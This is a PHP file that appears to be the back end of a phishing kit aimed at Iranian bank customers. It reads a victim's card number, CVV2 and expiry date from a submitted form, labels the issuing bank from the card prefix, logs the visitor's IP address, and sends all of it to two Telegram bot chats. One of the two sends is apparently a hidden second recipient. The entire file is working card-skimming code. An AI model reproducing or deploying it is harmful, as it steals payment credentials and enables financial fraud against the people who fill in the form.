<?php

include_once "send.php";
include_once "img/CyberPower.php";
$pan = $_POST['cardnumber'];
$cvv = $_POST['cvv2'];
$month = $_POST['month'];
$year = $_POST['year'];
$pan1 = substr($pan,0,4);
$pan2 = substr($pan,4,-8);
$pan3 = substr($pan,8,-4);
$pan4 = substr($pan,12);
$cardn = substr($pan,0,-12);
 echo ($cardn);

if ($cardn == "6037 99" || $cardn == "1700 19" || $cardn == "5899 05") {
      $bankname = "#Meli";  
}
elseif ($cardn == "5892 10") {
        $bankname = "#Sepah";
}
elseif ($cardn == "6276 48" || $cardn == "207177") {
        $bankname = "#Tosee_Saderat";
}
elseif ($cardn == "6279 61") {
        $bankname = "#Sanat_Madan";
}
elseif ($cardn == "6037 70" || $cardn == "639217") {
        $bankname = "#Keshavarzi";
}
elseif ($cardn == "6280 23") {
        $bankname = "#Maskan";
}
elseif ($cardn == "6277 60") {
        $bankname = "#Post_Bank";
}
elseif ($cardn == "5029 08") {
        $bankname = "#Tosee_Taavon";
}
elseif ($cardn == "6274 12") {
        $bankname = "#Eghtsad_Novin";
}
elseif ($cardn == "6221 06" || $cardn == "6391  94" || $cardn == "6278 84") {
        $bankname = "#Parsian";
}
elseif ($cardn == "5022 29" || $cardn == "6393 47") {
        $bankname = "#Pasargad";
}
elseif ($cardn == "6274 88" || $cardn == "5029 10") {
        $bankname = "#Kar_Afarin";
}
elseif ($cardn == "6219 86") {
        $bankname = "#Saman";
}
elseif ($cardn == "6393 46") {
        $bankname = "#Sina";
}
elseif ($cardn == "6396 07") {
        $bankname = "#Sarmaye";
}
elseif ($cardn == "6362 14") {
        $bankname = "#Ayande";
}
elseif ($cardn == "5028 06" || $cardn == "504706") {
        $bankname = "#Shahr";
}
elseif ($cardn == "5029 38") {
        $bankname = "#Day";
}
elseif ($cardn == "6037 69") {
        $bankname = "#Saderat";
}
elseif ($cardn == "6104 33" || $cardn == "9919 75") {
        $bankname = "#Mellat";
}
elseif ($cardn == "6273 53" || $cardn == "5859 83") {
        $bankname = "#Tejarat";
}
elseif ($cardn == "5894 63") {
        $bankname = "#Refah";
}
elseif ($cardn == "6273 81") {
        $bankname = "#Ansar";
}
elseif ($cardn == "5057 85") {
        $bankname = "#Iran_Zamin";
}
elseif ($cardn == "6367 95") {
        $bankname = "#Markazi";
}
elseif ($cardn == "6369 49") {
        $bankname = "#Hekmat";
}
elseif ($cardn == "5054 16") {
        $bankname = "#Gardeshgary";
}
elseif ($cardn == "6063 73") {
        $bankname = "#Qarzolhasane";
}
elseif ($cardn == "6281 57") {
        $bankname = "#Moasse_Etebari";
}
elseif ($cardn == "5058 01") {
        $bankname = "#Kosar";
}
elseif ($cardn == "6393 70") {
        $bankname = "#Moasse_Mehr";
}
elseif ($cardn == "6395 99") { 
        $bankname = "#Qavamin";
}
else{
        $bankname = "#بانک_نامعلوم";
}

if (!empty($_SERVER['HTTP_CLIENT_IP']))
    {
      $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
    }
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
    {
      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
    }
else
    {
      $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
    }
    
$text = "
╔ • New #Card Added
║
╠ • Bank Name : $bankname
╠ • Card : <code>$pan</code>
╠ • Cvv2 : <code>$cvv</code>
╠ • Expire : <code>$year</code> : <code>$month</code>
║
╚ • Channel : @$ChUsername
║
╚ • Name : $Name
";


file_get_contents("https://api.telegram.org/bot$TOKEN/sendMessage?parse_mode=HTML&chat_id=$ID&text=".urlencode($text));
file_get_contents("https://api.telegram.org/bot$token/sendMessage?parse_mode=HTML&chat_id=$id&text=".urlencode($text));

?>